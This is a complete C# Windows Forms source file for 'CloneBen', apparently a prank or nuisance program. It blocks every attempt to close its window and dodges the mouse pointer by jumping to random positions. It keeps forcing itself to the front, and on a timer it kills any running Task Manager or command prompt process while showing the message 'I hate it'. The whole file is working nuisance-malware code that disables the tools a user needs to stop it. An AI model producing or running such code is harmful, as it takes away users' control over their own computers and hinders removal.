using System;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

namespace CloneBen
{
    public partial class CloneBen : Form
    {
        public CloneBen()
        {
            InitializeComponent();   
        }

        // Moving CloneBen to random position
        private void MoveToRandPos()
        {
            Random random = new Random();
            Random random2 = new Random();

            int screenWidth = Screen.PrimaryScreen.Bounds.Width - 200;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height - 200;
            int xPosition = random.Next(0, screenWidth);
            int yPosition = random2.Next(0, screenHeight);
            base.Location = new Point(xPosition, yPosition);
        }

        // Disabling event to close program
        private void CloneBen_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        // Avoiding a mouse-pointer
        private void CloneBen_MouseEnter(object sender, EventArgs e)
        {
            MoveToRandPos();
        }
        private void CloneBen_MouseMove(object sender, MouseEventArgs e)
        {
            MoveToRandPos();
        }
        private void CloneBen_MouseDown(object sender, MouseEventArgs e)
        {
            MoveToRandPos();
        }

        // Killing enemy processes
        private void killEnemy_Tick(object sender, EventArgs e)
        {
            foreach (Process process in Process.GetProcesses())
            {
                string procName = process.ProcessName.ToLower();
                if (procName == "taskmgr" || procName == "cmd")
                {
                    process.Kill();
                    MessageBox.Show("I hate it", ":(");
                    break;
                }
            }
        }

        // Showing CloneBen
        private void showBen_Tick(object sender, EventArgs e)
        {
            this.TopMost = true;
            this.Focus();
            this.BringToFront();
            this.TopMost = false;
        }
    }
}
